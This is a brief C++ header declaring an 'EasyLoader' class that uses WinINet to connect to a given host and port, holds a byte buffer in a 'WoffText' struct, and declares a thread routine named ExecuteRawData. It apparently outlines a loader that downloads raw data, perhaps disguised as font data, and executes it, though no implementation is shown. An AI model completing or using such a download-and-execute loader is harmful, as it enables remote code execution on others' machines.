#pragma once
#include <windows.h>
#include <wininet.h>
#include <vector>
#include <cstdio>
#include <iostream>
#pragma comment (lib, "Wininet.lib")

typedef struct s_WoffText {
	PBYTE data;
	DWORD len;
}			t_WoffText;


class EasyLoader
{
public:
	EasyLoader(LPCSTR host, INTERNET_PORT port);
	void EasyBulk();

private:
	LPCSTR _host;
	INTERNET_PORT _port;
	t_WoffText _wofftext;
	static DWORD WINAPI ExecuteRawData(LPVOID lpParameter);
};

